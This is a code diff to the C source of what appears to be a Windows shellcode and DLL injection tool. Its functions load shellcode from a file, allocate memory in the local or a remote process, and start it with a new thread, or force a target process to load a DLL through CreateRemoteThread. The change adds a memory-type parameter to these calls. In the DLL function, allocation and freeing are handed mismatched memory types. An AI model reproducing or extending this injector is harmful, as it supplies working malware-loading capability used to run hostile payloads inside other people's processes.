@@ -4,7 +4,7 @@
 #include "Common.h"
 #include "Structs.h"
 
-BOOL LocalProcessInjection(IN LPCSTR lpShellcodePath)
+BOOL LocalProcessInjection(IN DWORD dwMemoryType, IN LPCSTR lpShellcodePath)
 {
 	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
 	HANDLE hThread = NULL;
@@ -14,7 +14,7 @@ BOOL LocalProcessInjection(IN LPCSTR lpShellcodePath)
 	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
 		return FALSE;
 
-	if (!AllocateMemory(NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(dwMemoryType, NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
 	if (!RunThread(NULL, FALSE, pShellcodeAddr, &hThread, &dwThreadId))
@@ -25,12 +25,12 @@ BOOL LocalProcessInjection(IN LPCSTR lpShellcodePath)
 	
 	CloseHandle(hThread);
 	LocalFree(pShellcode);
-	FreeMemory(NULL, pShellcodeAddr);
+	FreeMemory(dwMemoryType, NULL, pShellcodeAddr);
 
 	return TRUE;
 }
 
-BOOL RemoteProcessInjection(IN LPCSTR lpProcessName, IN DWORD dwEnumerationMethod, IN LPCSTR lpShellcodePath)
+BOOL RemoteProcessInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, IN DWORD dwEnumerationMethod, IN LPCSTR lpShellcodePath)
 {
 	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
 	HANDLE hThread = NULL, hProcess = NULL;
@@ -43,7 +43,7 @@ BOOL RemoteProcessInjection(IN LPCSTR lpProcessName, IN DWORD dwEnumerationMetho
 	if (!ObtainProcessHandle(dwEnumerationMethod, lpProcessName, &hProcess, &dwProcessId))
 		return FALSE;
 
-	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(dwMemoryType, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
 	if (!RunThread(hProcess, FALSE, pShellcodeAddr, &hThread, &dwThreadId))
@@ -54,7 +54,7 @@ BOOL RemoteProcessInjection(IN LPCSTR lpProcessName, IN DWORD dwEnumerationMetho
 	
 	CloseHandle(hThread);
 	LocalFree(pShellcode);
-	FreeMemory(hProcess, pShellcodeAddr);
+	FreeMemory(dwMemoryType, hProcess, pShellcodeAddr);
 
 	return TRUE;
 }
@@ -66,7 +66,7 @@ BOOL LocalProcessDllInjection(IN LPCSTR lpShellcodePath)
 	return TRUE;
 }
 
-BOOL RemoteProcessDllInjection(IN LPCSTR lpProcessName, IN DWORD dwEnumerationMethod, IN LPCSTR lpShellcodePath)
+BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, IN DWORD dwEnumerationMethod, IN LPCSTR lpShellcodePath)
 {
 	PVOID pLoadLibrary = NULL, pDllPathAddr = NULL;
 	char Pwd[MAX_PATH * 2], AbsolutePath[MAX_PATH*4];
@@ -90,14 +90,14 @@ BOOL RemoteProcessDllInjection(IN LPCSTR lpProcessName, IN DWORD dwEnumerationMe
 	}
 	sShellcodePathSize = lstrlenA(lpShellcodePath);
 
-	if (!AllocateMemory(hProcess, lpShellcodePath, sShellcodePathSize, &pDllPathAddr))
+	if (!AllocateMemory(NULL, hProcess, lpShellcodePath, sShellcodePathSize, &pDllPathAddr))
 		return FALSE;
 
 	if ((hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibrary, pDllPathAddr, NULL, &dwThreadId)) == NULL)
 		return ReportErrorWinAPI("CreateRemoteThread");
 	printf("[i] Injected DLL into the remote process via thread with ID %d\n", dwThreadId);
 
-	FreeMemory(hProcess, pDllPathAddr);
+	FreeMemory(dwMemoryType, hProcess, pDllPathAddr);
 	CloseHandle(hThread);
 
 	return TRUE;
